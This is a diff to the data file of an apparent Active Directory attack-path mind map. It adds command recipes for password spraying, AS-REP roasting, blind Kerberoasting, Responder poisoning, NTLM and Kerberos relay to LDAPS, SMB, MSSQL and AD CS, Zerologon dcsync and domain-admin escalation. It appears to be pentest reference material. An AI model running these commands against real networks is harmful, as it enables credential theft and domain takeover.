@@ -169,7 +169,7 @@ var AD_MAP_V2 = {
             { label: "poisoning LDAP", color: "#ffe14a" },
             { label: "poisoning HTTP", color: "#ffe14a" }
           ],
-          moveTo: []
+          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "captured SMB/LDAP/HTTP auth can be relayed to a service that accepts it" }]
         },
         {
           id: "coerce",
@@ -181,7 +181,7 @@ var AD_MAP_V2 = {
             "petitpotam.py -d <domain> <listener> <target>"
           ],
           outcomes: [{ label: "Coerce SMB", color: "#ffe14a" }],
-          moveTo: []
+          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "the coerced authentication is relayed to LDAP(S)/HTTP/SMB" }]
         },
         {
           id: "pxe",
@@ -214,32 +214,146 @@ var AD_MAP_V2 = {
 
     {
       id: "valid-user",
-      title: "Valid User",
+      title: "Valid user (no password)",
       color: "#3b9ee5",
-      tag: "Have a credential",
-      desc: "You hold at least one valid domain credential (or a crackable hash) — roast, spray and enumerate deeper.",
+      tag: "Have a username",
+      desc: "You hold at least one valid username (and maybe a password) — spray for credentials and roast pre-auth-disabled accounts.",
       techniques: [
         {
-          id: "asreproast",
-          title: "AS-REP Roasting",
-          theory: { label: "AS-REP Roasting", url: "theory/2026-08-18-asrep-roasting.html" },
+          id: "pw-spray",
+          title: "Password Spray",
+          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
           cve: null,
-          desc: "Accounts with Kerberos pre-auth disabled hand you a crackable AS-REP.",
-          cmds: [
-            "GetNPUsers.py <domain>/<user>:'<pass>' -request -format hashcat",
-            "hashcat -m 18200 asrep.txt wordlist.txt"
+          desc: "Try one password across many users. Read the lockout policy FIRST so you don't lock accounts.",
+          cmds: [],
+          branches: [
+            { label: "Get password policy — default policy", note: "You need creds, but get the policy first to avoid locking accounts.", cmds: [
+              "nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol",
+              "Get-ADDefaultDomainPasswordPolicy",
+              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy"
+            ] },
+            { label: "Get password policy — Fine-Grained (privileged)", cmds: [
+              "ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols",
+              "Get-ADFineGrainedPasswordPolicy -filter *",
+              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso   # runs as low-priv too, with less info"
+            ] },
+            { label: "user == password", warn: true, cmds: [
+              "nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success",
+              "sprayhound -U <users.txt> -d <domain> -dc <dc_ip>   # --lower / --upper to case-fold; nothing = user==pass"
+            ], outcomes: [{ label: "Clear text Credentials", color: "#4ade80" }] },
+            { label: "Usual passwords (Season+Year!, Company123 …)", warn: true, cmds: [
+              "nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success",
+              "sprayhound -U <users.txt> -p <password> -d <domain> -dc <dc_ip>",
+              "kerbrute passwordspray -d <domain> <users.txt> <password>"
+            ], outcomes: [{ label: "Clear text Credentials", color: "#4ade80" }] }
           ],
           outcomes: [],
           moveTo: []
         },
         {
-          id: "pw-spray",
-          title: "Password spraying",
-          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
+          id: "asreproast",
+          title: "ASREPRoast",
+          theory: { label: "AS-REP Roasting", url: "theory/2026-08-18-asrep-roasting.html" },
           cve: null,
-          desc: "Spray one common password across the user list (respect lockout) to land accounts.",
+          desc: "Accounts with Kerberos pre-auth disabled (and SPN-write via a pre-auth account) yield crackable tickets.",
+          cmds: [],
+          branches: [
+            { label: "List ASREPRoastable users (need creds)", cmds: [
+              "MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u   # BloodHound / Cypher"
+            ] },
+            { label: "ASREP roasting", cmds: [
+              "GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>",
+              "nxc ldap <dc_ip> -u <users.txt> -p '' --asreproast <output.txt>",
+              "Rubeus.exe asreproast /format:hashcat"
+            ], outcomes: [{ label: "Hash found ASREP", color: "#e8912e" }] },
+            { label: "Blind Kerberoasting", cmds: [
+              "Rubeus.exe kerberoast /domain:<domain> /dc:<dcip> /nopreauth:<asrep_user> /spns:<users.txt>",
+              "GetUserSPNs.py -no-preauth \"<asrep_user>\" -usersfile \"<user_list.txt>\" -dc-host \"<dc_ip>\" \"<domain>/\""
+            ], outcomes: [{ label: "Hash found TGS", color: "#e8912e" }] },
+            { label: "Kerberos RC4 downgrade", cve: "CVE-2022-33679", cmds: [
+              "CVE-2022-33679.py <domain>/<user> <target>"
+            ], outcomes: [{ label: "Lat move PTT", color: "#9ca3af" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        }
+      ]
+    },
+
+    {
+      id: "mitm",
+      title: "Man In The Middle (Listen and Relay)",
+      color: "#ffe14a",
+      tag: "Poison & relay",
+      desc: "Capture authentication on the wire and relay it to a service that will accept it.",
+      techniques: [
+        {
+          id: "listen",
+          title: "Listen",
+          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
+          cve: null,
+          desc: "Answer name resolution / capture SMB authentication to obtain hashes or credentials.",
           cmds: [
-            "kerbrute passwordspray -d <domain> --dc <dc_ip> users.txt '<Season2026!>'"
+            "responder -I <interface>   # use --lm to force a downgrade",
+            "smbclient.py"
+          ],
+          outcomes: [
+            { label: "Hash NTLMv1 or NTLMv2", color: "#e8912e" },
+            { label: "Username", color: "#3b9ee5" },
+            { label: "Credentials (ldap/http)", color: "#4ade80" }
+          ],
+          moveTo: []
+        },
+        {
+          id: "ntlm-relay",
+          title: "NTLM relay",
+          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
+          cve: null,
+          desc: "Relay captured/coerced NTLM authentication to a service, picking the target by what's unsigned/unenforced.",
+          cmds: [],
+          branches: [
+            { label: "MS08-068 self relay", cmds: ["msf> exploit/windows/smb/smb_relay   # Windows 2000 / Server 2008"] },
+            { label: "SMB → LDAP(S)", cve: "CVE-2019-1040", note: "NTLMv1: remove MIC (no CVE needed). NTLMv2: remove MIC (CVE-2019-1040).", outcomes: [{ label: "see LDAP(S)", color: "#ffe14a" }] },
+            { label: "HTTP(S) → LDAP(S)", note: "Usually from a WebDAV coercion — HTTP auth relays cross-protocol.", outcomes: [{ label: "see LDAP(S)", color: "#ffe14a" }] },
+            { label: "To LDAP(S) → RBCD", note: "Relay to LDAP when LDAP signing and LDAPS channel binding aren't enforced (the default).", cmds: [
+              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access"
+            ], outcomes: [{ label: "RBCD", color: "#10b981" }] },
+            { label: "To LDAP(S) → Shadow Credentials", cmds: [
+              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'"
+            ], outcomes: [{ label: "Shadow Credentials", color: "#9ca3af" }] },
+            { label: "To LDAP(S) → Domain Admin", cmds: [
+              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>"
+            ], outcomes: [{ label: "Domain admin", color: "#ef4444" }] },
+            { label: "To LDAP(S) → LDAP shell", cmds: [
+              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive   # nc 127.0.0.1 10111"
+            ], outcomes: [{ label: "LDAP SHELL", color: "#9ca3af" }] },
+            { label: "To SMB (SMB not signed)", note: "Find unsigned targets (default on non-DCs), then relay.", cmds: [
+              "nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt",
+              "ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks"
+            ], outcomes: [{ label: "SMB Socks", color: "#9ca3af" }] },
+            { label: "To HTTP → AD CS (ESC8)", note: "Relay to the CA web enrollment endpoint.", outcomes: [{ label: "ESC8", color: "#a855f7" }] },
+            { label: "To HTTP → WSUS", note: "Relay to WSUS.", outcomes: [{ label: "WSUS", color: "#9ca3af" }] },
+            { label: "To MSSQL", cmds: ["ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks"], outcomes: [{ label: "MSSQL Socks", color: "#9ca3af" }] },
+            { label: "SMB → NETLOGON (Zerologon)", cve: "CVE-2020-1472", note: "Zero-Logon (safe method) — relay one DC to another.", cmds: [
+              "ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>"
+            ], outcomes: [{ label: "DCSYNC", color: "#3b82f6" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "kerberos-relay",
+          title: "Kerberos relay",
+          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
+          cve: null,
+          desc: "Relay Kerberos instead of NTLM (krbrelayx) — useful where NTLM is blocked but you can coerce Kerberos.",
+          cmds: [],
+          branches: [
+            { label: "To HTTP → AD CS (ESC8)", cmds: [
+              "krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>"
+            ], outcomes: [{ label: "ESC8", color: "#a855f7" }] },
+            { label: "SMB → SMB", note: "Same as NTLM relay — use krbrelayx.py." },
+            { label: "SMB → LDAP(S)", note: "Same as NTLM relay — use krbrelayx.py." }
           ],
           outcomes: [],
           moveTo: []
